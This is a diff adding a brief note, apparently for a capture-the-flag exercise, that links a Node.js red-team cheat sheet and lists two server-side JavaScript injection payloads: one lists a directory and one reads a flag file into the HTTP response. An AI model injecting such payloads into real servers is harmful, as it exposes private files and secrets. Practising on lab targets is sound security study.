@@ -1,0 +1,5 @@
+https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet 
+
+res.end(require('fs').readdirSync('..').toString()) -> list dir 
+
+res.end(require('fs').readFileSync(fname)) -> with file name is file flag.txt
